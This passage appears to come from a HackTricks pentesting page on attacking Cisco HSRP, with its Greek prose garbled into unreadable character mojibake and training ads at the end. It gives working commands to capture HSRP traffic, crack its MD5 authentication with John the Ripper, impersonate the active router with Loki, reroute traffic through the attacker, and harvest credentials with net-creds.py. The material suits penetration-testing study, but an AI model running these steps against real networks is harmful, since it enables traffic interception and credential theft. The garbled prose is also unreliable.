Î±Î½Î¬Î»Ï…ÏƒÎ· ÎºÏ…ÎºÎ»Î¿Ï†Î¿ÏÎ¯Î±Ï‚.

#### Steps for Bypassing HSRP Authentication
1. Î‘Ï€Î¿Î¸Î·ÎºÎµÏÏƒÏ„Îµ Ï„Î·Î½ ÎºÏ…ÎºÎ»Î¿Ï†Î¿ÏÎ¯Î± Î´Î¹ÎºÏ„ÏÎ¿Ï… Ï€Î¿Ï… Ï€ÎµÏÎ¹Î­Ï‡ÎµÎ¹ Î´ÎµÎ´Î¿Î¼Î­Î½Î± HSRP Ï‰Ï‚ Î±ÏÏ‡ÎµÎ¯Î¿ .pcap.
```shell
tcpdump -w hsrp_traffic.pcap
```
2. Î•Î¾Î±Î³Î¬Î³ÎµÏ„Îµ MD5 hashes Î±Ï€ÏŒ Ï„Î¿ Î±ÏÏ‡ÎµÎ¯Î¿ .pcap Ï‡ÏÎ·ÏƒÎ¹Î¼Î¿Ï€Î¿Î¹ÏÎ½Ï„Î±Ï‚ Ï„Î¿ hsrp2john.py.
```shell
python2 hsrp2john.py hsrp_traffic.pcap > hsrp_hashes
```
3. Î£Ï€Î¬ÏƒÏ„Îµ Ï„Î¿Ï…Ï‚ MD5 hashes Ï‡ÏÎ·ÏƒÎ¹Î¼Î¿Ï€Î¿Î¹ÏÎ½Ï„Î±Ï‚ Ï„Î¿Î½ John the Ripper.
```shell
john --wordlist=mywordlist.txt hsrp_hashes
```

**Executing HSRP Injection with Loki**

1. Î•ÎºÎºÎ¹Î½Î®ÏƒÏ„Îµ Ï„Î¿ Loki Î³Î¹Î± Î½Î± ÎµÎ½Ï„Î¿Ï€Î¯ÏƒÎµÏ„Îµ Ï„Î¹Ï‚ Î´Î¹Î±Ï†Î·Î¼Î¯ÏƒÎµÎ¹Ï‚ HSRP.
2. Î¡Ï…Î¸Î¼Î¯ÏƒÏ„Îµ Ï„Î· Î´Î¹ÎºÏ„Ï…Î±ÎºÎ® Î´Î¹ÎµÏ€Î±Ï†Î® ÏƒÎµ promiscuous mode ÎºÎ±Î¹ ÎµÎ½ÎµÏÎ³Î¿Ï€Î¿Î¹Î®ÏƒÏ„Îµ Ï„Î·Î½ Ï€ÏÎ¿ÏÎ¸Î·ÏƒÎ· IP.
```shell
sudo ip link set eth0 promisc on
sudo sysctl -w net.ipv4.ip_forward=1
```
3. Î§ÏÎ·ÏƒÎ¹Î¼Î¿Ï€Î¿Î¹Î®ÏƒÏ„Îµ Ï„Î¿ Loki Î³Î¹Î± Î½Î± ÏƒÏ„Î¿Ï‡ÎµÏÏƒÎµÏ„Îµ Ï„Î¿Î½ ÏƒÏ…Î³ÎºÎµÎºÏÎ¹Î¼Î­Î½Î¿ Î´ÏÎ¿Î¼Î¿Î»Î¿Î³Î·Ï„Î®, ÎµÎ¹ÏƒÎ¬Î³ÎµÏ„Îµ Ï„Î¿Î½ ÏƒÏ€Î±ÏƒÎ¼Î­Î½Î¿ ÎºÏ‰Î´Î¹ÎºÏŒ HSRP ÎºÎ±Î¹ ÎµÎºÏ„ÎµÎ»Î­ÏƒÏ„Îµ Ï„Î¹Ï‚ Î±Ï€Î±ÏÎ±Î¯Ï„Î·Ï„ÎµÏ‚ ÏÏ…Î¸Î¼Î¯ÏƒÎµÎ¹Ï‚ Î³Î¹Î± Î½Î± Ï€ÏÎ¿ÏƒÏ€Î¿Î¹Î·Î¸ÎµÎ¯Ï„Îµ Ï„Î¿Î½ Î•Î½ÎµÏÎ³ÏŒ Î”ÏÎ¿Î¼Î¿Î»Î¿Î³Î·Ï„Î®.
4. Î‘Ï†Î¿Ï Î±Ï€Î¿ÎºÏ„Î®ÏƒÎµÏ„Îµ Ï„Î¿Î½ ÏÏŒÎ»Î¿ Ï„Î¿Ï… Î•Î½ÎµÏÎ³Î¿Ï Î”ÏÎ¿Î¼Î¿Î»Î¿Î³Î·Ï„Î®, ÏÏ…Î¸Î¼Î¯ÏƒÏ„Îµ Ï„Î· Î´Î¹ÎºÏ„Ï…Î±ÎºÎ® ÏƒÎ±Ï‚ Î´Î¹ÎµÏ€Î±Ï†Î® ÎºÎ±Î¹ Ï„Î¿Ï…Ï‚ Ï€Î¯Î½Î±ÎºÎµÏ‚ IP Î³Î¹Î± Î½Î± Ï€Î±Î³Î¹Î´ÎµÏÏƒÎµÏ„Îµ Ï„Î·Î½ ÎºÎ±Î½Î¿Î½Î¹ÎºÎ® ÎºÏ…ÎºÎ»Î¿Ï†Î¿ÏÎ¯Î±.
```shell
sudo ifconfig eth0:1 10.10.100.254 netmask 255.255.255.0
sudo iptables -t nat -A POSTROUTING -o eth0 -j MASQUERADE
```
5. Î¤ÏÎ¿Ï€Î¿Ï€Î¿Î¹Î®ÏƒÏ„Îµ Ï„Î¿Î½ Ï€Î¯Î½Î±ÎºÎ± Î´ÏÎ¿Î¼Î¿Î»ÏŒÎ³Î·ÏƒÎ·Ï‚ Î³Î¹Î± Î½Î± Î´ÏÎ¿Î¼Î¿Î»Î¿Î³Î®ÏƒÎµÏ„Îµ Ï„Î·Î½ ÎºÏ…ÎºÎ»Î¿Ï†Î¿ÏÎ¯Î± Î¼Î­ÏƒÏ‰ Ï„Î¿Ï… Ï€ÏÏÎ·Î½ Î•Î½ÎµÏÎ³Î¿Ï Î”ÏÎ¿Î¼Î¿Î»Î¿Î³Î·Ï„Î®.
```shell
sudo route del default
sudo route add -net 0.0.0.0 netmask 0.0.0.0 gw 10.10.100.100
```
6. Î§ÏÎ·ÏƒÎ¹Î¼Î¿Ï€Î¿Î¹Î®ÏƒÏ„Îµ Ï„Î¿ net-creds.py Î® Î­Î½Î± Ï€Î±ÏÏŒÎ¼Î¿Î¹Î¿ ÎµÏÎ³Î±Î»ÎµÎ¯Î¿ Î³Î¹Î± Î½Î± ÎºÎ±Ï„Î±Î³ÏÎ¬ÏˆÎµÏ„Îµ Î´Î¹Î±Ï€Î¹ÏƒÏ„ÎµÏ…Ï„Î®ÏÎ¹Î± Î±Ï€ÏŒ Ï„Î·Î½ Ï€Î±Î³Î¹Î´ÎµÏ…Î¼Î­Î½Î· ÎºÏ…ÎºÎ»Î¿Ï†Î¿ÏÎ¯Î±.
```shell
sudo python2 net-creds.py -i eth0
```

Î— ÎµÎºÏ„Î­Î»ÎµÏƒÎ· Î±Ï…Ï„ÏÎ½ Ï„Ï‰Î½ Î²Î·Î¼Î¬Ï„Ï‰Î½ Ï„Î¿Ï€Î¿Î¸ÎµÏ„ÎµÎ¯ Ï„Î¿Î½ ÎµÏ€Î¹Ï„Î¹Î¸Î­Î¼ÎµÎ½Î¿ ÏƒÎµ Î¸Î­ÏƒÎ· Î½Î± Ï€Î±Î³Î¹Î´ÎµÏÏƒÎµÎ¹ ÎºÎ±Î¹ Î½Î± Ï‡ÎµÎ¹ÏÎ¹ÏƒÏ„ÎµÎ¯ Ï„Î·Î½ ÎºÏ…ÎºÎ»Î¿Ï†Î¿ÏÎ¯Î±, Ï€Î±ÏÏŒÎ¼Î¿Î¹Î± Î¼Îµ Ï„Î· Î´Î¹Î±Î´Î¹ÎºÎ±ÏƒÎ¯Î± Î³Î¹Î± Ï„Î·Î½ ÎºÎ±Ï„Î¬Î»Î·ÏˆÎ· GLBP. Î‘Ï…Ï„ÏŒ Ï…Ï€Î¿Î³ÏÎ±Î¼Î¼Î¯Î¶ÎµÎ¹ Ï„Î·Î½ ÎµÏ…Ï€Î¬Î¸ÎµÎ¹Î± ÏƒÎµ Ï€ÏÏ‰Ï„ÏŒÎºÎ¿Î»Î»Î± Î±Î½Î±Î³Î½Ï‰ÏƒÎ¹Î¼ÏŒÏ„Î·Ï„Î±Ï‚ ÏŒÏ€Ï‰Ï‚ Ï„Î¿ HSRP ÎºÎ±Î¹ Ï„Î·Î½ Î±Î½Î¬Î³ÎºÎ· Î³Î¹Î± Î¹ÏƒÏ‡Ï…ÏÎ¬ Î¼Î­Ï„ÏÎ± Î±ÏƒÏ†Î±Î»ÎµÎ¯Î±Ï‚.

## References
- [https://medium.com/@in9uz/cisco-nightmare-pentesting-cisco-networks-like-a-devil-f4032eb437b9](https://medium.com/@in9uz/cisco-nightmare-pentesting-cisco-networks-like-a-devil-f4032eb437b9)

<figure><img src="https://pentest.eu/RENDER_WebSec_10fps_21sec_9MB_29042024.gif" alt=""><figcaption></figcaption></figure>

{% embed url="https://websec.nl/" %}

{% hint style="success" %}
Learn & practice AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
* **Join the** ğŸ’¬ [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** ğŸ¦ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}
